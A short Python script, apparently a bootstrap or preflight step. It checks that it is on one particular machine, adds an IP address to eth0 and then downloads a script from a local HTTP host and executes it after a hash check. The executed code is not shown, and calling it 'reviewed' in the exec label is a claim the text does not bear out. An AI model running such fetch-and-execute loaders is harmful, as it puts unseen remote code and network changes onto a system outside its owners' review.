import hashlib,os,subprocess,urllib.request
from pathlib import Path
assert os.uname().release=='6.8.12-a10irq2'
assert Path('/proc/sys/kernel/random/boot_id').read_text().strip()=='0978088a-8d10-45b2-8f43-726d00209313'
assert hashlib.sha256(Path('/etc/machine-id').read_bytes()).hexdigest()=='ea4ea714200e50181c4375b385b1e3c4a0f6d199ccb60182d62f86bcf47b64ec'
addresses=subprocess.check_output(['ip','-j','-4','addr','show','dev','eth0'],text=True)
if '192.168.2.2' not in addresses:subprocess.run(['nmcli','--wait','8','device','modify','eth0','+ipv4.addresses','192.168.2.2/24'],check=True,capture_output=True)
b=urllib.request.urlopen('http://192.168.2.1:8765/preflight.py',timeout=15).read(65536)
assert hashlib.sha256(b).hexdigest()=='7822f8bc083d783d06af2f6f5ae896024e64ce65258772d31fecd17f23dcca3f'
exec(compile(b,'reviewed_authfix_preflight','exec'))
